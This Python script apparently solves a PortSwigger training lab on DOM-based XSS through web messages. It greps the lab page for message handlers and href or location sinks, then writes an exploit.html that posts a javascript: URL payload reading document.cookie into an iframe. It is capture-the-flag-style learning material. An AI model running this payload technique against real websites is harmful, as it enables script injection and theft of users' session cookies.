"""
Lab 2: DOM XSS using web messages and a JavaScript URL
https://portswigger.net/web-security/dom-based/web-message-manipulation/lab-dom-xss-using-web-messages-and-a-javascript-url
Difficulty: Practitioner

📝 The flaw: the handler checks the message has an expected shape
(e.g. a specific "type" or structure matching a "next page" link feature)
then assigns a field from it to something like an anchor's href or
window.location — a javascript: URI survives that shape-check and executes
on use (click, or sometimes immediately depending on the sink).
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns, build_postmessage_poc

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking for a message handler that reads a URL-shaped field and")
    note("assigns it into href/location rather than innerHTML directly.")
    grep_for_patterns(source, ["addEventListener('message'", ".href", "location ="])

    # Shape matches what the lab's handler typically expects — adjust key
    # names after confirming the real handler via the page's JS source.
    message_js_literal = "JSON.stringify({ type: 'nextProduct', url: 'javascript:alert(document.cookie)' })"

    html = build_postmessage_poc(iframe_src=f"{TARGET}/", message_payload=message_js_literal)

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")
    note("This lab usually needs the resulting link to be CLICKED by the")
    note("victim (javascript: URIs rarely fire on mere assignment) — confirm")
    note("against the actual sink and adjust the auto-click step if needed.")


if __name__ == "__main__":
    run()
